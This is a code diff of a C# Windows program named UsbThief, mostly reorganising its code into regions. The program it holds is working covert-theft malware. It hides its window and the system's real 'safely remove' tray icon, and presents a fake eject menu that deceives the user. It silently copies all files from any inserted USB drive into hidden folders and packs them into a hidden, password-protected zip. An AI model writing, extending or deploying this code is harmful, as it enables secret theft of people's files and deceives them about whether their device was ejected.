@@ -20,22 +20,30 @@ namespace UsbThief
 {
     public partial class Form1 : Form
     {
+        #region 声明变量
         public const int innerVer = 0;
         public string workspace = Application.StartupPath + "\\data\\diskcache\\files\\";
-        public Logger logger = LogManager.GetCurrentClassLogger();
         public bool showRealMenu = false;
         public bool fc2c = false;
-        public SynchronizationContext mainThreadSynContext;
-        //Thread th;
-
-        public Thread copyT;
-        public Thread compT;
         public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
         public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
         public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
         public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
         public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
         public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
+        public Logger logger = LogManager.GetCurrentClassLogger();
+        public SynchronizationContext mainThreadSynContext;
+        public Thread copyT;
+        public Thread compT;
+        public Status sta = Status.none;
+        public Config conf = new Config { enable = false, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
+        public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
+        public enum Status
+        {
+            none,
+            copying,
+            compressing
+        }
         public struct Config
         {
             public bool enable;
@@ -50,15 +58,8 @@ namespace UsbThief
             public string name;
             public string ser;
         }
-        public enum Status
-        {
-            none,
-            copying,
-            compressing
-        }
-        public Config conf = new Config { enable = false, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
-        public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
-        public Status sta = Status.none;
+        #endregion
+        #region 初始化
         public Form1()
         {
             InitializeComponent();
@@ -67,7 +68,6 @@ namespace UsbThief
             copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
             compT = new Thread(new ParameterizedThreadStart(Compress));
             mainThreadSynContext = SynchronizationContext.Current;
-            //HideRealMenu();
             notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
             notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
             notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
@@ -109,90 +109,32 @@ namespace UsbThief
             }
 
         }
-        private void HideFiles(string path)
+        #endregion
+        #region 窗口加载
+        private void Form1_Load(object sender, EventArgs e)
         {
-            try
-            {
-                if (Directory.Exists(path))
-                {
-                    DirectoryInfo d = new DirectoryInfo(path);
-                    FileSystemInfo[] fsinfos = d.GetFileSystemInfos();
-                    foreach (FileSystemInfo fsinfo in fsinfos)
-                    {
-                        File.SetAttributes(fsinfo.FullName, FileAttributes.Hidden);
-                        if (fsinfo is DirectoryInfo)     //判断是否为文件夹
-                        {
-                            HideFiles(fsinfo.FullName);//递归调用
-                        }
-                    }
-                }
-            }
-            catch (Exception e)
-            {
-                logger.Error("无法将工作目录设为隐藏：\n" + e);
-            }
-
+            logger.Info("窗体已加载");
+            SetVisibleCore(false);
+            logger.Info("窗体已隐藏");
         }
-        private void HideRealMenu()
+        protected override void SetVisibleCore(bool value)
         {
-            try
+            base.SetVisibleCore(value);
+        }
+        #endregion
+        #region 托盘图标相关
+        private void NotifyIcon1_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
             {
-                logger.Info("尝试隐藏安全弹出托盘图标");
-                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray", true);
-                key.SetValue("Services", 29, RegistryValueKind.DWord);
-                Process.Start("systray");
-                logger.Info("安全弹出托盘图标已隐藏");
-            }
-            catch (Exception e)
-            {
-                showRealMenu = true;
-                logger.Info("安全弹出托盘图标无法隐藏：\n" + e);
+                MethodInfo mi = typeof(NotifyIcon).GetMethod("ShowContextMenu", BindingFlags.Instance | BindingFlags.NonPublic);
+                mi.Invoke(notifyIcon1, null);
             }
         }
-        private void WriteConf(string ser, Status s)
+        private void Item0_Click(object sender, EventArgs e)
         {
-            sta = s;
-            try
-            {
-                Dictionary<string, string> devices = new Dictionary<string, string>();
-                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
-                string line;
-                while ((line = sr.ReadLine()) != null)
-                {
-                    string tmpSer = line.Split(':')[0];
-                    string status = line.Split(':')[1];
-                    if (tmpSer == ser)
-                    {
-                        continue;
-                    }
-                    devices.Add(tmpSer, status);
-                }
-                sr.Close();
-                devices.Add(ser, s.ToString());
-                FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.Create);
-                StreamWriter sw = new StreamWriter(fs);
-                foreach (var item in devices)
-                {
-                    sw.WriteLine(item.Key + ":" + item.Value);
-                }
-                sw.Close();
-                fs.Close();
-            }
-            catch (Exception)
-            {
-                try
-                {
-                    FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.OpenOrCreate);
-                    StreamWriter sw = new StreamWriter(fs);
-                    sw.WriteLine(ser + ":" + s.ToString());
-                    sw.Close();
-                    fs.Close();
-                }
-                catch (Exception e)
-                {
-                    logger.Info("写入状态失败：\n" + e);
-                }
-            }
+            Process.Start("control", "printers");
+            logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
         }
         private void Item2_Click(object sender, EventArgs e)
         {
@@ -202,41 +144,8 @@ namespace UsbThief
             notifyIcon1.Visible = false;
             logger.Info("用户以为他弹出了设备，其实并没有~");
         }
-        private void Item0_Click(object sender, EventArgs e)
-        {
-            Process.Start("control", "printers");
-            logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
-        }
-        private void NotifyIcon1_MouseUp(object sender, MouseEventArgs e)
-        {
-            if (e.Button == MouseButtons.Left)
-            {
-                MethodInfo mi = typeof(NotifyIcon).GetMethod("ShowContextMenu", BindingFlags.Instance | BindingFlags.NonPublic);
-                mi.Invoke(notifyIcon1, null);
-            }
-        }
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            logger.Info("窗体已加载");
-            SetVisibleCore(false);
-            logger.Info("窗体已隐藏");
-
-        }
-        private string GetUsbSer(string driName)
-        {
-            using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
-            {
-                try
-                {
-                    return disk.Properties["VolumeSerialNumber"].Value.ToString();
-                }
-                catch (Exception e)
-                {
-                    logger.Error("设备序列号获取失败：\n" + e);
-                    return null;
-                }
-            }
-        }
+        #endregion
+        #region 监听Usb插入消息
         protected override void WndProc(ref Message m)
         {
             try
@@ -259,8 +168,6 @@ namespace UsbThief
                                     {
                                         if (currentDevice.name == "none" && currentDevice.ser == "none" && sta == Status.none)
                                         {
-                                            //try
-                                            //{
                                             string ser = GetUsbSer(drive.Name);
                                             if (ser != null)
                                             {
@@ -283,7 +190,7 @@ namespace UsbThief
                                         }
                                         if (drive.VolumeLabel != "仿生人会涮电子羊吗")
                                         {
-                                            WriteConf(currentDevice.ser, Status.copying);
+                                            WriteSta(currentDevice.ser, Status.copying);
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                             copyT.Start(para);
                                         }
@@ -340,11 +247,11 @@ namespace UsbThief
                             }
                             if (!exist && currentDevice.name != "none" && currentDevice.ser != "none")
                             {
-                                //copyT.Abort();
                                 logger.Info("USB设备“" + currentDevice.ser + "”已拔出");
                                 currentDevice.name = "none";
                                 currentDevice.ser = "none";
                                 notifyIcon1.Visible = false;
+                                HideRealMenu(true);
                             }
                         }
                     }
@@ -356,59 +263,131 @@ namespace UsbThief
             }
             base.WndProc(ref m);
         }
-        protected override void SetVisibleCore(bool value)
+        #endregion
+        #region 写状态文件
+        private void WriteSta(string ser, Status s)
         {
-            base.SetVisibleCore(value);
-        }
-        private bool CheckExt(string ext)
-        {
-            return true;
-        }
-
-        private void Compress(object s)
-        {
-            string ser = (string)s;
-            WriteConf(ser, Status.compressing);
+            sta = s;
             try
             {
-                string path = workspace + ser;
-                string dest = path + ".zip";
-                if (File.Exists(dest))
-                    File.Delete(dest);
-                logger.Info("正在压缩：" + path);
-                using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
+                Dictionary<string, string> devices = new Dictionary<string, string>();
+                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
+                string line;
+                while ((line = sr.ReadLine()) != null)
                 {
-                    zip.Password = "qiegewala";
-                    zip.AddDirectory(path, ser);
-                    zip.Save();
+                    string tmpSer = line.Split(':')[0];
+                    string status = line.Split(':')[1];
+                    if (tmpSer == ser)
+                    {
+                        continue;
+                    }
+                    devices.Add(tmpSer, status);
+                }
+                sr.Close();
+                devices.Add(ser, s.ToString());
+                FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.Create);
+                StreamWriter sw = new StreamWriter(fs);
+                foreach (var item in devices)
+                {
+                    sw.WriteLine(item.Key + ":" + item.Value);
+                }
+                sw.Close();
+            }
+            catch (Exception)
+            {
+                try
+                {
+                    FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.OpenOrCreate);
+                    StreamWriter sw = new StreamWriter(fs);
+                    sw.WriteLine(ser + ":" + s.ToString());
+                    sw.Close();
+                }
+                catch (Exception e)
+                {
+                    logger.Info("写入状态失败：\n" + e);
+                }
+            }
+        }
+        #endregion
+        #region 隐藏文件
+        private void HideFiles(string path)
+        {
+            try
+            {
+                if (Directory.Exists(path))
+                {
+                    DirectoryInfo d = new DirectoryInfo(path);
+                    FileSystemInfo[] fsinfos = d.GetFileSystemInfos();
+                    foreach (FileSystemInfo fsinfo in fsinfos)
+                    {
+                        File.SetAttributes(fsinfo.FullName, FileAttributes.Hidden);
+                        if (fsinfo is DirectoryInfo)     //判断是否为文件夹
+                        {
+                            HideFiles(fsinfo.FullName);//递归调用
+                        }
+                    }
                 }
             }
             catch (Exception e)
             {
-                logger.Error("压缩失败：\n" + e);
+                logger.Error("无法将工作目录设为隐藏：\n" + e);
             }
-            WriteConf(ser, Status.none);
-            logger.Info("压缩完成");
-            HideFiles(workspace);
         }
-        private void CopyDoneCallback(object state)
+        #endregion
+        #region 隐藏/显示“安全弹出”托盘图标
+        private void HideRealMenu(bool show = false)
         {
-
-            logger.Info("复制完成");
-            if (fc2c)
+            try
             {
-                logger.Info("压缩线程启动");
-                compT.Start(currentDevice.ser);
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray", true);
+                if (show)
+                {
+                    logger.Info("尝试显示安全弹出托盘图标");
+                    key.DeleteValue("Services", false);
+                }
+                else
+                {
+                    logger.Info("尝试隐藏安全弹出托盘图标");
+                    key.SetValue("Services", 29, RegistryValueKind.DWord);
+                }
+                Process.Start("systray");
+                logger.Info("安全弹出托盘图标已隐藏/显示");
             }
-            else
+            catch (Exception e)
             {
-                WriteConf(currentDevice.ser, Status.none);
+                showRealMenu = true;
+                logger.Info("安全弹出托盘图标无法隐藏/显示：\n" + e);
             }
         }
+        #endregion
+        #region 获取Usb设备序列号
+        private string GetUsbSer(string driName)
+        {
+            using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
+            {
+                try
+                {
+                    return disk.Properties["VolumeSerialNumber"].Value.ToString();
+                }
+                catch (Exception e)
+                {
+                    logger.Error("设备序列号获取失败：\n" + e);
+                    return null;
+                }
+            }
+        }
+        #endregion
+        #region 检测扩展名
+        private bool CheckExt(string ext)
+        {
+            return true;
+        }
+        #endregion
+        #region 复制文件
         private void Copy2Disk(object obj)
         {
             string[] str = (string[])obj;
-            WriteConf(str[0], Status.copying);
+            WriteSta(str[0], Status.copying);
             CopyLoop(str[1], str[2]);
             HideFiles(workspace);
             mainThreadSynContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
@@ -462,6 +441,49 @@ namespace UsbThief
                 logger.Error("文件复制出错：\n" + e);
             }
         }
+        private void CopyDoneCallback(object state)
+        {
+
+            logger.Info("复制完成");
+            if (fc2c)
+            {
+                logger.Info("压缩线程启动");
+                compT.Start(currentDevice.ser);
+            }
+            else
+            {
+                WriteSta(currentDevice.ser, Status.none);
+            }
+        }
+        #endregion
+        #region 压缩文件
+        private void Compress(object s)
+        {
+            string ser = (string)s;
+            WriteSta(ser, Status.compressing);
+            try
+            {
+                string path = workspace + ser;
+                string dest = path + ".zip";
+                if (File.Exists(dest))
+                    File.Delete(dest);
+                logger.Info("正在压缩：" + path);
+                using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
+                {
+                    zip.Password = "qiegewala";
+                    zip.AddDirectory(path, ser);
+                    zip.Save();
+                }
+                File.SetAttributes(dest, FileAttributes.Hidden);
+            }
+            catch (Exception e)
+            {
+                logger.Error("压缩失败：\n" + e);
+            }
+            WriteSta(ser, Status.none);
+            logger.Info("压缩完成");
+        }
+        #endregion
     }
     //private void CopyDirectory(string sourcePath, string destinationPath)
     //{
